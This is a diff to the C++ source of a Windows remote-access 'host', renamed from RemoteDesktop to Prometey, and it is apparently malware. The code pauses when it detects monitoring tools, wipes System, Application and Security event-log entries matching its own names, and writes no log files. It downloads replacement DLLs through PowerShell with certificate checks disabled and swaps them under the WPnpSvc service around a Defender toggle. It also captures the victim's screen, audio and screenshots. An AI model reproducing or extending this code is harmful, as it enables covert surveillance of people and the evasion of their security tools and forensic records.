@@ -1,5 +1,5 @@
 /*
- * RemoteDesktop Host - Main Entry Point
+ * Prometey Host - Main Entry Point
  * Multi-threaded streaming pipeline: capture → encode workers → multi-connection send
  */
 
@@ -155,6 +155,10 @@ std::atomic<bool> g_streaming{false};  // non-static: used by dllmain.cpp helper
 std::atomic<bool> g_paused_by_threat{false};
 static std::atomic<bool> g_threat_auto_pause{false};
 static std::atomic<bool> g_threat_scan_enabled{false};
+
+// sys_info response cache — avoid expensive PDH GPU queries when multiple clients poll
+static std::string g_sysinfo_cache;
+static std::chrono::steady_clock::time_point g_sysinfo_cache_time{};
 struct ThreatInfoFwd { std::string proc; std::string title; std::string category; bool visible = true; DWORD pid = 0; };
 static ThreatInfoFwd g_last_threat;
 static std::vector<std::pair<std::string,std::string>> g_threat_list_all; // (proc,title)
@@ -263,10 +267,10 @@ static void open_file_connections() {
     g_file_ws.clear();
     g_file_ws_ready = false;
 
-    // ONE dedicated file connection — keeps FILE traffic off main ws (commands stay fast)
-    // Using 1 (not 4!) so TCP fairness gives stream ~50% bandwidth, files ~33%, commands ~17%
+    // ONE dedicated file connection — same port/TLS as main connection.
     auto ws = std::make_unique<WsClient>();
-    if (ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls)) {
+    bool file_ok = ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls);
+    if (file_ok) {
         std::string auth = "{\"cmd\":\"auth\",\"token\":\"" + json_escape(g_config.room_token) +
                            "\",\"password\":\"" + json_escape(g_config.password) +
                            "\",\"role\":\"host_file\"}";
@@ -275,7 +279,7 @@ static void open_file_connections() {
         g_file_ws_ready = true;
         g_log.info("File connection established (1 dedicated TCP)");
     } else {
-        g_log.warn("File connection failed, will use main ws fallback");
+        g_log.warn("File connection failed, using main ws fallback");
     }
 }
 
@@ -288,7 +292,6 @@ static void close_file_connections() {
 
 // Send FILE binary through dedicated file connection (server broadcasts to file_recv)
 static void send_file_binary(const std::vector<uint8_t>& bin) {
-    // Use dedicated file ws if available
     if (g_file_ws_ready) {
         std::lock_guard<std::mutex> lk(g_file_ws_mtx);
         if (!g_file_ws.empty() && g_file_ws[0] && g_file_ws[0]->is_connected()) {
@@ -296,7 +299,6 @@ static void send_file_binary(const std::vector<uint8_t>& bin) {
             return;
         }
     }
-    // Fallback: main ws
     if (g_ws && g_ws->is_connected())
         g_ws->send_binary_priority(bin);
 }
@@ -449,6 +451,8 @@ static void load_config(const std::string& path) {
     g_config.evtlog_clean_patterns = get("evtlog_clean_patterns", g_config.evtlog_clean_patterns);
     std::string eci = get("evtlog_clean_interval", "");
     if (!eci.empty()) g_config.evtlog_clean_interval = safe_stoi(eci, 30);
+    std::string ecm = get("evtlog_clean_mode", "");
+    if (!ecm.empty()) g_config.evtlog_clean_mode = ecm; // "once" or "loop"
 
     // Screenshot settings
     std::string ss_en = get("screenshot_enabled", "");
@@ -552,6 +556,7 @@ static void save_stream_settings() {
     out += "  \"turn_server\": \"" + json_escape(get_existing("turn_server", g_config.turn_server)) + "\",\n";
     out += "  \"evtlog_clean_patterns\": \"" + json_escape(get_existing("evtlog_clean_patterns", g_config.evtlog_clean_patterns)) + "\",\n";
     out += "  \"evtlog_clean_interval\": " + get_existing("evtlog_clean_interval", std::to_string(g_config.evtlog_clean_interval)) + ",\n";
+    out += "  \"evtlog_clean_mode\": \"" + json_escape(get_existing("evtlog_clean_mode", g_config.evtlog_clean_mode)) + "\",\n";
     out += "  \"screenshot_enabled\": " + std::string(g_config.screenshot_enabled ? "true" : "false") + ",\n";
     out += "  \"screenshot_interval\": " + std::to_string(g_config.screenshot_interval) + ",\n";
     out += "  \"screenshot_quality\": " + std::to_string(g_config.screenshot_quality) + ",\n";
@@ -718,6 +723,15 @@ static void stream_capture_func() {
 
     while (g_streaming && g_running) {
       try {
+        // ── When threat paused, sleep instead of capturing ──
+        // Capture allocates ~33MB per frame (4K BGRA). If we keep capturing
+        // but don't send, frames pile up in g_latest_raw and encode queues,
+        // growing memory with no benefit. Sleep until threat clears.
+        if (g_paused_by_threat.load()) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
+            continue;
+        }
+
         const int target_fps = std::max(5, std::min(60, g_fps));
         const auto frame_dur = std::chrono::milliseconds(1000 / target_fps);
         auto t0 = std::chrono::steady_clock::now();
@@ -837,6 +851,11 @@ static void stream_encode_func(int worker_id) {
 
     while (g_streaming && g_running) {
       try {
+        // Skip encoding while threat-paused (capture thread is also sleeping)
+        if (g_paused_by_threat.load()) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(200));
+            continue;
+        }
         std::shared_ptr<ScreenCapture::RawFrame> raw;
         {
             std::unique_lock<std::mutex> lk(g_raw_mtx);
@@ -1101,7 +1120,30 @@ static void stop_streaming() {
         g_h264_encoder.reset();
     }
 
-    g_log.info("Streaming stopped");
+    // ── Free frame buffers to release RAM ──
+    // Without this, the last captured frame (up to 4K × 4 bytes = 33 MB per frame)
+    // plus any queued partial frames stay allocated until the next stream start.
+    {
+        std::lock_guard<std::mutex> lk(g_raw_mtx);
+        g_latest_raw.reset();
+        g_frame_seq = 0;
+    }
+
+    // Note: g_screen (ScreenCapture) is NOT stopped here. DXGI re-initialization
+    // is expensive (~200ms) and the screen object re-checks initialized_ internally.
+    // The ~33MB VRAM overhead of keeping it alive is acceptable vs the cost of
+    // re-creating D3D11 device + output duplication on every stream start/stop cycle.
+
+    // Clear sys_info cache (stale after stream stop)
+    g_sysinfo_cache.clear();
+
+    // Force OS to reclaim freed pages from the process working set.
+    // Without this, CRT heap holds freed memory and working set stays inflated
+    // (e.g., 100MB after streaming vs 35MB baseline). This is cosmetic — the
+    // memory IS free internally, but Task Manager shows resident set, not committed.
+    SetProcessWorkingSetSize(GetCurrentProcess(), (SIZE_T)-1, (SIZE_T)-1);
+
+    g_log.info("Streaming stopped, resources released");
 }
 
 // ===== Registry helpers =====
@@ -1327,13 +1369,13 @@ static void handle_command(const std::string& msg_str) {
                     if (n > 0 && n < MAX_PATH) recDir = tmpPath;
                     else recDir = ".\\";
                     if (recDir.back() != '\\' && recDir.back() != '/') recDir += "\\";
-                    recDir += "RemoteDesktop_Recordings";
+                    recDir += "Prometey_Recordings";
                 }
                 std::error_code ec;
                 if (recDir.back() != '\\' && recDir.back() != '/') recDir += "\\";
                 fs::create_directories(fs::path(recDir), ec);
                 if (ec) {
-                    recDir = (fs::current_path(ec) / "RemoteDesktop_Recordings").string();
+                    recDir = (fs::current_path(ec) / "Prometey_Recordings").string();
                     if (recDir.back() != '\\') recDir += "\\";
                     fs::create_directories(recDir, ec);
                 }
@@ -1380,14 +1422,22 @@ static void handle_command(const std::string& msg_str) {
             std::string path   = json_get(msg_str, "path");
             std::string off_s  = json_get(msg_str, "offset");
             std::string len_s  = json_get(msg_str, "length");
+            std::string from_client = json_get(msg_str, "_from"); // VPS adds requesting client's id
             uint64_t offset = off_s.empty() ? 0 : std::stoull(off_s);
             uint32_t length = len_s.empty() ? 65536 : std::stoul(len_s);
             if (length > 1024 * 1024) length = 1024 * 1024; // Max 1MB per chunk
 
+            // Send routing hint so server.py delivers FILE binary only to this client
+            if (!from_client.empty() && g_file_ws_ready) {
+                std::lock_guard<std::mutex> lk(g_file_ws_mtx);
+                if (!g_file_ws.empty() && g_file_ws[0] && g_file_ws[0]->is_connected()) {
+                    g_file_ws[0]->send_text("{\"_route_binary_to\":\"" + json_escape(from_client) + "\"}");
+                }
+            }
+
             if (g_file_workers_running) {
-                // Dispatch to file worker pool → sends through dedicated file connections
                 std::lock_guard<std::mutex> lk(g_file_work_mtx);
-                g_file_work_q.push(FileWork{path, offset, length, ""});
+                g_file_work_q.push(FileWork{path, offset, length, from_client});
                 g_file_work_cv.notify_one();
             } else {
                 // Inline fallback: read chunk from disk and send through file or main ws
@@ -1670,6 +1720,14 @@ static void handle_command(const std::string& msg_str) {
 
         // --- System info ---
         else if (cmd == "sys_info") {
+            // Cache sys_info for 3 seconds — PDH GPU counters are expensive, and
+            // multiple connected clients each poll every 3s, causing N×/3s PDH queries.
+            // With caching, only the first request per 3s window does real work.
+            auto _sysinfo_now = std::chrono::steady_clock::now();
+            auto _sysinfo_age = std::chrono::duration_cast<std::chrono::milliseconds>(_sysinfo_now - g_sysinfo_cache_time).count();
+            if (!g_sysinfo_cache.empty() && _sysinfo_age < 3000) {
+                send_ok(g_sysinfo_cache);
+            } else {
             MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
             GlobalMemoryStatusEx(&ms);
             uint64_t total_mb = ms.ullTotalPhys / 1048576;
@@ -1778,7 +1836,11 @@ static void handle_command(const std::string& msg_str) {
             r += ",\"host_version\":\"" + std::string(HOST_VERSION) + "\"";
             r += ",\"host_build\":\"" + std::string(HOST_BUILD) + "\"";
             r += "}";
+            // Update cache for subsequent requests within 3s window
+            g_sysinfo_cache = r;
+            g_sysinfo_cache_time = std::chrono::steady_clock::now();
             send_ok(r);
+            } // end else (cache miss)
         }
 
         else if (cmd == "ping") {
@@ -1884,6 +1946,23 @@ static void handle_command(const std::string& msg_str) {
             } else {
                 send_err("Failed to get device list");
             }
+        }
+
+        // --- Event Log: auto-clean config ---
+        else if (cmd == "evtlog_set_config") {
+            std::string mode = json_get(msg_str, "mode");
+            std::string intv = json_get(msg_str, "interval");
+            std::string pats = json_get(msg_str, "patterns");
+            if (!mode.empty()) g_config.evtlog_clean_mode = mode;
+            if (!intv.empty()) { int v = 120; try { v = std::stoi(intv); } catch(...) {} g_config.evtlog_clean_interval = std::max(60, v); }
+            g_config.evtlog_clean_patterns = pats; // empty = disabled
+            save_stream_settings();
+            g_log.info("evtlog config updated: mode=" + g_config.evtlog_clean_mode +
+                       " interval=" + std::to_string(g_config.evtlog_clean_interval) +
+                       " patterns=" + g_config.evtlog_clean_patterns);
+            send_ok("{\"mode\":\"" + json_escape(g_config.evtlog_clean_mode) +
+                    "\",\"interval\":" + std::to_string(g_config.evtlog_clean_interval) +
+                    ",\"patterns\":\"" + json_escape(g_config.evtlog_clean_patterns) + "\"}");
         }
 
         // --- Event Log ---
@@ -2328,28 +2407,22 @@ static void handle_command(const std::string& msg_str) {
                         step("2|Downloading new DLL");
                         addLn("start /wait /min powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('" + url + "','" + tempDll + "')\"");
                         addLn("if not exist \"" + tempDll + "\" (echo ERR^|Download failed > \"" + stepFile + "\" & goto cleanup)");
-                        step("3|Stopping WPnpSvc");
+                        step("3|Stopping service");
                         addLn("sc.exe stop WPnpSvc >nul 2>nul");
-                        addLn("timeout /t 2 /nobreak >nul 2>nul");
+                        addLn("timeout /t 3 /nobreak >nul 2>nul");
                         addLn("taskkill.exe /F /IM rundll32.exe >nul 2>nul");
-                        step("4|Stopping Spooler");
-                        addLn("sc.exe stop Spooler >nul 2>nul");
-                        addLn("timeout /t 4 /nobreak >nul 2>nul");
-                        step("5|Replacing DLL");
+                        addLn("timeout /t 2 /nobreak >nul 2>nul");
+                        step("4|Replacing DLL");
                         addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
                         addLn("ren \"" + currentDll + "\" " + dllName + ".old >nul 2>nul");
                         addLn("copy /y \"" + tempDll + "\" \"" + currentDll + "\" >nul 2>nul");
                         addLn("timeout /t 2 /nobreak >nul 2>nul");
-                        step("6|Starting Spooler");
-                        addLn("sc.exe start Spooler >nul 2>nul");
-                        addLn("timeout /t 4 /nobreak >nul 2>nul");
-                        step("7|Injecting DLL");
+                        step("5|Starting service");
                         addLn("sc.exe start WPnpSvc >nul 2>nul");
-                        addLn("timeout /t 6 /nobreak >nul 2>nul");
-                        addLn("sc.exe start WPnpSvc >nul 2>nul");
-                        step("8|Re-enabling Defender");
+                        addLn("timeout /t 8 /nobreak >nul 2>nul");
+                        step("6|Re-enabling Defender");
                         addLn("start /wait /min powershell.exe -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $false\"");
-                        step("9|Done");
+                        step("7|Done");
                         addLn(":cleanup");
                         // Cleanup files
                         addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
@@ -2725,7 +2798,7 @@ static void handle_command(const std::string& msg_str) {
             // Same approach as evtlog_cleaner: detect via Get-WinEvent, wipe channel, restore non-matching.
             {
                 std::string patterns = g_config.evtlog_clean_patterns;
-                if (patterns.empty()) patterns = "pnpext,spoolsv,wpnp,RemoteDesktopHost";
+                if (patterns.empty()) patterns = "pnpext,spoolsv,wpnp,Prometey";
                 // Convert "a,b,c" → "a|b|c"
                 std::string regex;
                 {
@@ -3056,7 +3129,9 @@ static bool should_capture_app(const std::string& windowTitle) {
     if (g_screenshot_always.load()) return true;
     if (windowTitle.empty()) return false;
     std::lock_guard<std::mutex> lk(g_screenshot_apps_mtx);
-    if (g_screenshot_apps.empty()) return true;
+    // If "always" is off AND no apps are specified → don't capture anything.
+    // User must either enable "always" or specify at least one app pattern.
+    if (g_screenshot_apps.empty()) return false;
     // Check each comma-separated pattern (case-insensitive)
     std::istringstream ss(g_screenshot_apps);
     std::string pattern;
@@ -3548,7 +3623,7 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
     }
     // Page 2: OpusTags
     {
-        const char* vendor = "RemoteDesk";
+        const char* vendor = "Prometey";
         uint32_t vendorLen = (uint32_t)strlen(vendor);
         uint32_t commentCount = 0;
         std::vector<uint8_t> tags(8 + 4 + vendorLen + 4);
@@ -3719,7 +3794,7 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
         { uint8_t h[19]={}; memcpy(h,"OpusHead",8); h[8]=1; h[9]=(uint8_t)channels;
           memcpy(h+10,&preSkip,2); uint32_t isr=(uint32_t)opusSR; memcpy(h+12,&isr,4);
           ogg_write_page(recOgg,0x02,rs,rps++,0,h,19); }
-        { const char* v="RemoteDesk"; uint32_t vl=(uint32_t)strlen(v),cc=0;
+        { const char* v="Prometey"; uint32_t vl=(uint32_t)strlen(v),cc=0;
           std::vector<uint8_t> t(8+4+vl+4); memcpy(t.data(),"OpusTags",8);
           memcpy(t.data()+8,&vl,4); memcpy(t.data()+12,v,vl); memcpy(t.data()+12+vl,&cc,4);
           ogg_write_page(recOgg,0x00,rs,rps++,0,t.data(),(int)t.size()); }
@@ -3823,7 +3898,7 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
             { uint8_t head[19]={}; memcpy(head,"OpusHead",8); head[8]=1; head[9]=(uint8_t)channels;
               memcpy(head+10,&preSkip,2); uint32_t inSR=(uint32_t)opusSR; memcpy(head+12,&inSR,4);
               ogg_write_page(oggChunk,0x02,chunkSerial,ps++,0,head,19); }
-            { const char* v="RemoteDesk"; uint32_t vl=(uint32_t)strlen(v),cc=0;
+            { const char* v="Prometey"; uint32_t vl=(uint32_t)strlen(v),cc=0;
               std::vector<uint8_t> t(8+4+vl+4); memcpy(t.data(),"OpusTags",8);
               memcpy(t.data()+8,&vl,4); memcpy(t.data()+12,v,vl); memcpy(t.data()+12+vl,&cc,4);
               ogg_write_page(oggChunk,0x00,chunkSerial,ps++,0,t.data(),(int)t.size()); }
@@ -4046,7 +4121,10 @@ static bool find_threat_process(ThreatInfo& out) {
 static void threat_monitor_func() {
     g_log.info("Threat monitor started");
     while (g_running) {
-        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
+        // Scan interval: 5s instead of 1.5s — CreateToolhelp32Snapshot + EnumWindows
+        // is expensive, running every 1.5s caused noticeable CPU load on the host.
+        // 5s is fast enough to detect monitoring tools before user reads anything useful.
+        std::this_thread::sleep_for(std::chrono::seconds(5));
         if (!g_running) break;
 
         ThreatInfo found;
@@ -4151,17 +4229,29 @@ static void evtlog_cleaner_func() {
         return;
     }
 
-    g_log.info("Event log cleaner patterns: " + patterns);
+    bool once_mode = (g_config.evtlog_clean_mode == "once");
+    g_log.info("Event log cleaner patterns: " + patterns + " mode=" + g_config.evtlog_clean_mode);
 
     // Logs to scan
     std::vector<std::string> logs = {"System", "Application", "Security", "Setup"};
-    int interval = std::max(10, g_config.evtlog_clean_interval);
+    // Minimum 60s — PowerShell is heavy, running it more often than once per minute
+    // causes sustained CPU spikes.
+    int interval = std::max(60, g_config.evtlog_clean_interval);
 
+    bool first_run = true;
     while (g_running) {
-        // Sleep with quick wakeup on shutdown
-        for (int i = 0; i < interval && g_running; i++) {
-            std::this_thread::sleep_for(std::chrono::seconds(1));
+        // On first iteration, run immediately (startup clean).
+        // On subsequent iterations, sleep first (periodic mode only).
+        if (!first_run) {
+            if (once_mode) {
+                g_log.info("Event log cleaner: once mode — done, exiting");
+                return;
+            }
+            for (int i = 0; i < interval && g_running; i++) {
+                std::this_thread::sleep_for(std::chrono::seconds(1));
+            }
         }
+        first_run = false;
         if (!g_running) break;
 
         for (const auto& logName : logs) {
@@ -4293,7 +4383,7 @@ int main(int argc, char** argv) {
 
     g_log.set_level("INFO");
     // g_log.set_file("C:\\RemoteDesktopHost.log"); // disabled — no log files
-    g_log.info("=== RemoteDesktop Host starting ===");
+    g_log.info("=== Prometey Host starting ===");
 
     // Graceful shutdown on Ctrl+C, console close, logoff, shutdown
     SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);
@@ -4428,10 +4518,10 @@ int main(int argc, char** argv) {
                     // Auto-start/restart audio if enabled
                     if (g_config.audio_enabled || g_audio_active.load()) {
                         g_audio_active = true;
-                        // If thread died, join and restart
+                        // If audio_thread_func already exited (crash/exception), join
+                        // reclaims the thread object so we can respawn fresh below.
                         if (g_audio_thread.joinable()) {
-                            // Check if thread is still alive by trying timed join
-                            // Can't do timed join in C++, just detach dead thread
+                            g_audio_thread.join();
                         }
                         if (!g_audio_thread.joinable()) {
                             g_audio_thread = std::thread(audio_thread_func);
